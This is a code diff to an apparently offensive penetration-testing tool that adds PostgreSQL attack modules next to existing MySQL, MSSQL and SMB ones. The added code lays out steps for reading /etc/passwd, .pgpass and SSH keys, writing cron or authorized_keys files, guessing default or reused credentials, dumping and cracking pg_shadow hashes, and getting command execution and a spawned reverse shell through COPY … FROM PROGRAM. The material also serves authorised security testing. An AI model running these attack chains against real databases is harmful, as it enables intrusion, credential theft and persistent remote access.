+    L.append(f"\n{BOLD}C. File read / write (superuser){RESET}")
+    if superuser:
+        L.append(f"  {CYAN}superuser{RESET} {DIM}→ pg_read_file('/var/lib/postgresql/.pgpass'|'/etc/passwd'|SSH keys); "
+                 f"lo_import/lo_export & COPY TO to write files (cron, authorized_keys){RESET}")
+    else:
+        L.append(f"  {DIM}no superuser on the current cred — pg_read_file/lo_export are gated{RESET}")
+
+    L.append(f"\n{BOLD}D. CVEs surfaced in this phase{RESET}")
+    if found:
+        for c in found:
+            ktag = f"  {RED}KEV{RESET}" if c in kev else ""
+            L.append(f"  {c}{ktag}  {DIM}https://nvd.nist.gov/vuln/detail/{c}{RESET}")
+    else:
+        L.append(f"  {DIM}none surfaced — CVE-2019-9193 (COPY PROGRAM), CVE-2018-1058 (search_path); "
+                 f"searchsploit '{ver or 'PostgreSQL <version>'}'{RESET}")
+
+    L.append(f"\n{BOLD}E. Loot recap & pivot{RESET}")
+    if dbs:
+        L.append(f"  {CYAN}databases:{RESET} {', '.join(dbs[:8])}"
+                 + (f" {DIM}+{len(dbs) - 8}{RESET}" if len(dbs) > 8 else ""))
+    L.append(f"  {DIM}dump full tables for secrets; dblink / postgres_fdw to reach linked hosts; "
+             f".pgpass & connection strings → other DBs{RESET}")
+
+    L.append(f"\n{BOLD}F. Verify unconfirmed findings from this phase{RESET}")
+    if warns:
+        for w in warns:
+            L.append(f"  {w}")
+    else:
+        L.append(f"  {DIM}none flagged — nothing sat on the fence{RESET}")
+
+    L.append(f"\n{BOLD}G. Re-run & housekeeping{RESET}")
+    L.append(f"  {DIM}crack pg_shadow hashes then reuse; psql-rce/psql-shell drop & re-drop a pshunter_rce "
+             f"temp table — if a run was interrupted, DROP TABLE IF EXISTS pshunter_rce/pshunter_sh{RESET}")
+    return "\n".join(L)
+
+
 # ══ MS SQL Server (1433 / 1434) ══ the version is discoverable unauthenticated: the SQL Browser
 # (UDP 1434, SSRP) advertises instances + version, and the TDS pre-login on 1433 returns version
 # bytes. Both are pure stdlib; auth / xp_cmdshell / queries later go through netexec (TDS binary).
@@ -14450,6 +15131,10 @@ def _spawn_shell_paths(ip: str) -> list:
         rce = next((o for s, o in fetch_scripts(ip, p, pr) if s == "mysql-rce"), "")
         if "✗ RCE " in rce:
             paths.append(("MySQL", "reverse shell via the INTO OUTFILE webshell", "mysql-shell", p, pr))
+    for p, pr in by_key.get("psql", []):
+        rce = next((o for s, o in fetch_scripts(ip, p, pr) if s == "psql-rce"), "")
+        if "✗ RCE " in rce:
+            paths.append(("PostgreSQL", "reverse shell via COPY … FROM PROGRAM (superuser)", "psql-shell", p, pr))
     for p, pr in by_key.get("mssql", []):
         if _gather_mssql_admin(ip):
             paths.append(("MSSQL", "xp_cmdshell → PowerShell reverse shell (sysadmin)", "mssql-shell", p, pr))
@@ -14565,6 +15250,12 @@ _STEP_TOOLS = {
     "mysql-rce": ("INTO OUTFILE webshell → exec-verified RCE (FILE priv); UDF guidance", _tool_mysql_rce),
     "mysql-shell": ("MySQL foothold → reverse shell via the OUTFILE webshell (spawned)", _tool_mysql_shell),
     "mysql-next": ("manual MySQL steps (context-aware, reference only)", _tool_mysql_next),
+    "psql-banner": ("PostgreSQL wire handshake → SSL + auth method + version (stdlib)", _tool_psql_banner),
+    "psql-creds": ("postgres blank/default + reused creds; flags superuser (psql CLI)", _tool_psql_creds),
+    "psql-loot": ("DBs/roles, pg_shadow hashes, app creds, pg_read_file (psql, read-only)", _tool_psql_loot),
+    "psql-rce": ("COPY … FROM PROGRAM command exec → exec-verified RCE (superuser)", _tool_psql_rce),
+    "psql-shell": ("PostgreSQL foothold → reverse shell via COPY … FROM PROGRAM (spawned)", _tool_psql_shell),
+    "psql-next": ("manual PostgreSQL steps (context-aware, reference only)", _tool_psql_next),
     "mssql-banner": ("MSSQL fingerprint — SQL Browser 1434 / TDS pre-login → version (stdlib)", _tool_mssql_banner),
     "mssql-creds": ("sa blank/default + reused creds (netexec mssql, flags sysadmin)", _tool_mssql_creds),
     "mssql-exec": ("xp_cmdshell command exec confirm (netexec -x, sysadmin)", _tool_mssql_exec),
@@ -14667,6 +15358,12 @@ _STEP_TOOL_RUNS = {
     "mysql-rce":        ("mysql CLI + HTTP verify", f"{_mins(_MYSQLRCE_DEADLINE)} min"),
     "mysql-shell":      ("Python (smart listener)", None),
     "mysql-next":       ("reference · no scan", None),
+    "psql-banner":      ("Python (stdlib) + searchsploit", None),
+    "psql-creds":       ("psql CLI", f"{_mins(_PGCREDS_DEADLINE)} min"),
+    "psql-loot":        ("psql CLI", f"{_mins(_PGLOOT_DEADLINE)} min"),
+    "psql-rce":         ("psql CLI (COPY PROGRAM)", f"{_mins(_PGRCE_DEADLINE)} min"),
+    "psql-shell":       ("Python (smart listener)", None),
+    "psql-next":        ("reference · no scan", None),
     "mssql-banner":     ("Python (stdlib) + searchsploit", None),
     "mssql-creds":      ("netexec mssql", f"{_mins(_MSSQLCREDS_DEADLINE)} min"),
     "mssql-exec":       ("netexec mssql -x", None),
@@ -14760,7 +15457,7 @@ def _run_step_tool(ip: str, target: tuple, n: int) -> None:
         return
     tlabel, runner = _STEP_TOOLS[tool_key]
 
-    if tool_key in ("foothold", "next-steps", "smb-foothold", "smb-next", "winrm-shell", "winrm-next", "ftp-foothold", "ftp-next", "tftp-next", "telnet-next", "mysql-next", "mssql-next", "ssh-next", "ldap-next"):  # foreground: interactive / print-now
+    if tool_key in ("foothold", "next-steps", "smb-foothold", "smb-next", "winrm-shell", "winrm-next", "ftp-foothold", "ftp-next", "tftp-next", "telnet-next", "mysql-next", "psql-next", "mssql-next", "ssh-next", "ldap-next"):  # foreground: interactive / print-now
         prev = fetch_step_status(ip, port, proto, key).get(n)
         set_step_status(ip, port, proto, key, n, "running")
         try:
@@ -14769,7 +15466,7 @@ def _run_step_tool(ip: str, target: tuple, n: int) -> None:
             print(f"{RED}✗ {tool_key} error: {exc}{RESET}")
             set_step_status(ip, port, proto, key, n, prev)
             return
-        if tool_key in ("next-steps", "smb-next", "winrm-next", "ftp-next", "tftp-next", "telnet-next", "mysql-next", "mssql-next", "ssh-next", "ldap-next"):  # a list to read now, not a scan result
+        if tool_key in ("next-steps", "smb-next", "winrm-next", "ftp-next", "tftp-next", "telnet-next", "mysql-next", "psql-next", "mssql-next", "ssh-next", "ldap-next"):  # a list to read now, not a scan result
             print("\n" + out)
             out = re.sub(r"\x1b\[[0-9;]*m", "", out)           # store clean text (no ANSI) in DETAILS
         save_scripts(ip, [{"id": tool_key, "port": port, "proto": proto, "output": out}])
